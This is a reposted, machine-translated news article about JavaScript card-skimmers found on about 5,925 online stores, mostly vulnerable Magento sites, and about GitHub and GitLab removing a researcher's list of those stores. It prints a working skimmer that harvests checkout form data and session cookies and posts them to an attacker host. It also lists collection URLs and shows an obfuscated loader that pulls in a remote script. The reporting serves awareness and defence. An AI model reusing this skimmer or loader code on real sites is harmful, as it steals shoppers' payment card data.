<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Github deletes the list of 5925 online stores with JS-skimmers installed</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Online skimming is a relatively new form of bank card fraud. The essence is clear from the title. If a regular skimmer is an overlay on an ATM card co...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Github deletes the list of 5925 online stores with JS-skimmers installed</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/f34/0fd/b9f/f340fdb9fb194d8cad3a0d6a73f6bb7a.jpg"><br><br>  Online skimming is a relatively new form of bank card fraud.  The essence is clear from the title.  If a regular skimmer is an overlay on an ATM card collector that dumps a magnetic strip, then an online skimmer is a software tab on an online store server that passively intercepts payment data while it is entered by the user into text fields in the browser.  Until now, cardders have concentrated mainly on transaction servers, where encryption is used, but in this case the information is removed before encryption.  Then information about payment cards is sold on underground forums: usually, an outsider can make payments using these cards. <br><br>  Security experts at Nightly Secure <a href="https://gwillem.gitlab.io/2016/10/11/5900-online-stores-found-skimming/">say</a> that online skimming has been gaining popularity recently.  For the first time about the spread of such fraud <a href="https://www.byte.nl/blog/widespread-credit-card-hijacking-discovered">started talking in 2015</a> .  As of November 2015, from the list of 255,000 online stores, 3501 stores with JS bookmarks on the server were discovered.  During the year their number increased by 69%. <br><a name="habracut"></a><br>  A sample javascript bookmark for intercepting payment data looks like this (in this case, the information is sent to <code>http://ownsafety.org/opp.php</code> ): 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="javascript hljs">&lt;script&gt;<span class="hljs-comment"><span class="hljs-comment">// &lt;![CDATA[ // whitespace added for readability --wdg function j(e) { var t = "; " + document.cookie, o = t.split("; " + e + "="); return 2 == o.length ? o.pop().split(";").shift() : void 0 } j("SESSIID") || (document.cookie = "SESSIID=" + (new Date).getTime()), jQuery(function(e) { e("button").on("click", function() { var t = "", o = "post", n = window.location; if (new RegExp("onepage|checkout").test(n)) { for (var c = document.querySelectorAll("input, select, textarea, checkbox"), i = 0; i &lt; c.length; i++) if (c[i].value.length &gt; 0) { var a = c[i].name; "" == a &amp;&amp; (a = i), t += a + "=" + c[i].value + "&amp;" } if (t) { var l = new RegExp("[0-9]{13,16}"), u = new XMLHttpRequest; u.open(o, e(" &lt;div /&gt;").html("http://ownsafety.org/opp.php").text(), !0), u.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), u.send(t + "&amp;asd=" + (l.test(t.replace(/s/g, "")) ? 1 : 0) + "&amp;utmp=" + n + "&amp;cookie=" + j("SESSIID")), console.clear() } } }) }); // ]]&gt;&lt;/script&gt;</span></span></code> </pre> <br>  Last year, researchers compiled a list of the most frequently used addresses for data collection: <br><br><pre> <code class="hljs ruby"><span class="hljs-number"><span class="hljs-number">1860</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/ownsafety.org/opp</span></span>.php <span class="hljs-number"><span class="hljs-number">390</span></span> <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/ownsafety.org/opp</span></span>.php <span class="hljs-number"><span class="hljs-number">309</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/useagleslogistics.com/gates</span></span><span class="hljs-regexp"><span class="hljs-regexp">/jquery.php 100 https:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/redwiggler.org/wp</span></span>-content/themes/jquerys.php <span class="hljs-number"><span class="hljs-number">70</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/clickvisits.biz/xrc</span></span>.php <span class="hljs-number"><span class="hljs-number">28</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/gamula.eu/jquery</span></span>.php <span class="hljs-number"><span class="hljs-number">23</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/gamula.ru/order</span></span>.php <span class="hljs-number"><span class="hljs-number">22</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/news-daily.me/gt</span></span><span class="hljs-regexp"><span class="hljs-regexp">/ 20 https:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/antaras.xyz/jquery</span></span>.php <span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/clicksale.xyz/xrc</span></span>.php <span class="hljs-number"><span class="hljs-number">10</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/ausfunken.com/service</span></span><span class="hljs-regexp"><span class="hljs-regexp">/css.php 9 http:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/www.dobell.com/var</span></span><span class="hljs-regexp"><span class="hljs-regexp">/extendware/system</span></span><span class="hljs-regexp"><span class="hljs-regexp">/licenses/encoder</span></span><span class="hljs-regexp"><span class="hljs-regexp">/mage_ajax.php 5 https:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/redwiggler.org/wp</span></span>-content/themes/jquery.php <span class="hljs-number"><span class="hljs-number">1</span></span> /js/index.php <span class="hljs-number"><span class="hljs-number">1</span></span> /js/am/extensions/sitemap_api.php <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/infopromo.biz/lib</span></span><span class="hljs-regexp"><span class="hljs-regexp">/jquery.php 1 https:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/google-adwords-website.biz/gates</span></span><span class="hljs-regexp"><span class="hljs-regexp">/jquery.php 1 https:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/bandagesplus.com/order</span></span>.php <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/nearart.com/order</span></span>.php <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/happysocks.in/jquery</span></span>.pl</code> </pre> <br>  In almost all cases, small versions of the same code are used. <br><br>  Such a tab is quite difficult to detect on the server.  The code is loaded from the CMS and works in the browser.  At the three and a half thousand sites mentioned last year, she worked for several months, for many six months and more. <br><br>  Experts believe that a large number of infected servers indicates a high degree of attack automation.  This is done not by some script kiddies, but by good professionals.  Probably from Russia. <br><br>  For the introduction of bookmarks used vulnerabilities in the software of online stores.  First of all, this is the vulnerable Magento Commerce software.  It is through it that the easiest way to implement the CMS code, although in fact this code can work in any online store that does not necessarily use Magento.  Check the online store for vulnerabilities on <a href="https://www.magereport.com/">MageReports.com</a> . <br><br>  Although the problem was raised a year ago, over the past year it has not disappeared anywhere.  Worse, the infected online stores became one and a half times larger.  In March 2016, the number of stores with skimmers increased from 3,501 to 4,476, and in September 2016 - to 5,925. <br><br>  The guys from Nightly Secure published a list of all infected stores to warn customers - and notify the administrators of these stores about the vulnerability.  Indeed, among them were quite popular sites, including the branches of automakers (Audi ZA), government organizations (NRSC, Malaysia), sites of popular musicians (Bjork), and non-profit organizations (Science Museum, Washington Cathedral). <br><br>  If a year ago almost all stores used small modifications of the same online skimmer, now researchers have already found 9 separate script varieties belonging to 3 different families ( <a href="https://github.com/gwillem/magento-malware-collection/tree/master/js">samples code on Github</a> ). <br><br>  The attackers have become smarter and now use multi-level code obfuscation, which is not so easy to disassemble.  For example, the script may be masked like this: <br><br><img src="https://habrastorage.org/files/6a9/412/0e2/6a94120e2bd847caa177a503d27c3ee1.png"><br><br>  Real malware code: <br><br><pre> <code class="javascript hljs">&lt;script language=<span class="hljs-string"><span class="hljs-string">"javascript"</span></span>&gt;<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>[<span class="hljs-string"><span class="hljs-string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span></span>][<span class="hljs-string"><span class="hljs-string">"\x77\x72\x69\x74\x65"</span></span>](<span class="hljs-string"><span class="hljs-string">'\x3c\x73\x63\x72'</span></span>+<span class="hljs-string"><span class="hljs-string">'\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x69\x70\x2e\x35\x75\x75\x38\x2e\x63\x6f\x6d\x2f\x69\x70\x2f\x69\x70\x5f'</span></span>+<span class="hljs-string"><span class="hljs-string">'\x34\x30\x37\x39\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72'</span></span>+<span class="hljs-string"><span class="hljs-string">'\x69\x70\x74\x3e'</span></span>);<span class="hljs-comment"><span class="hljs-comment">//4079&lt;/script&gt;</span></span></code> </pre> <br>  The authors also improved the mechanism for intercepting payment card data.  If earlier, the malware simply intercepted pages with the <code>checkout</code> string in the URL, then now it already recognizes the popular payment plugins Firecheckout, Onestepcheckout and Paypal. <br><br>  Specialists from Nightly Secure tried to contact a number of stores (about 30) and inform them about the installed skimmer, but did not receive a response from most of the stores, while others showed surprising carelessness.  One said that this is not his problem, because payments are processed by a third-party company.  The second said that it was just a Javascript error, not a threat.  The third one said at all that there can be no danger, because ‚Äúthe store works on HTTPS‚Äù.  The author submitted a list of stores with skimmers to Google for blacklisting Chrome Safe Browsing. <br><br>  A list of all stores with skimmers was originally <a href="https://gist.github.com/gwillem/41084af200e0e5a8455681fa5858f5cc">published on Github</a> .  And here the most interesting began.  Soon, Github, without warning, <a href="https://gwillem.gitlab.io/2016/10/14/github-censored-research-data/">deleted from his site the publication of the results of a study of online stores</a> . <br><br>  Apparently, Github censored the standard procedure, receiving a DMCA request from one of the stores.  Of course, the store is unpleasant when they find it vulnerable and tell the whole world. <br><br>  Yesterday, the author moved the results of the research of the safety of online stores <a href="https://gitlab.com/gwillem/public-snippets/snippets/28813">to Gitlab hosting</a> .  Today, a page at this address returns error 404. A few hours ago, the author <a href="https://news.ycombinator.com/item%3Fid%3D12713003">received a letter</a> from Gitlab explaining the reasons for the deletion.  According to the administration, the publication of the list of vulnerable stores is considered as a ‚Äúblatant case‚Äù that cannot be resolved.  Therefore, the list has been deleted (UPD: <a href="https://about.gitlab.com/2016/10/15/gitlab-reinstates-list-of-servers-that-have-malware/">access restored</a> , Gitlab director apologized). <br><br>  <b><a href="https://gitlab.com/gwillem/public-snippets/snippets/28813">Copy of the list in the web archive</a></b> <br>  <b><a href="http://pastebin.com/rYqEeuNm">Copy on pastebin</a></b> <br><br>  Note that the list of stores with installed online skimmers lists 44 domains in the .RU zone. <br><br>  Hopefully, the administrators of these stores will quickly install a version of Magento with the latest patches and compensate for losses to customers who have copies of payment cards leaked to the black market. </div><p>Source: <a href="https://habr.com/ru/post/398279/">https://habr.com/ru/post/398279/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../398265/index.html">RadarCat recognizes the objects and materials from which they are made.</a></li>
<li><a href="../398267/index.html">2016 Nobel Prize in Economics awarded for contract theory</a></li>
<li><a href="../398269/index.html">Created a human brain implant to get tactile sensations from a mechanical arm</a></li>
<li><a href="../398273/index.html">The heart begins to work even before it is fully formed</a></li>
<li><a href="../398275/index.html">Samsung officially stops sales and halts Galaxy Note 7 production.</a></li>
<li><a href="../398283/index.html">Project Blue: A small space telescope to search for exoplanets in the Alpha Centauri system</a></li>
<li><a href="../398291/index.html">New Dawn of the Giants</a></li>
<li><a href="../398293/index.html">Top Selling Games in History</a></li>
<li><a href="../398297/index.html">Installing Metatrader 4 on a VPS under Debian 8</a></li>
<li><a href="../398299/index.html">WristWhirl: a prototype of a gesture-driven smartwatch</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>